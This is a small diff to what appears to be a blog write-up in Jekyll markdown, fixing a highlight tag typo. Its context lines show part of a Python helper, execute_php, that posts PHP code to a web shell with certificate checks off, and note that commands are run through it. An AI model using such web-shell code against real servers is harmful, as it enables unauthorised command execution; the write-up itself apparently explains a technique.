@@ -147,7 +147,7 @@ def execute_php(base_url, shell_webpath, shell_param, php_code):
     data = {shell_param: php_code}
     r = requests.post(shell_url, data, verify=False)
     return r.text
-{% endhighlight%}
+{% endhighlight %}
 
 For executing commands, we call that execute_php function.
 
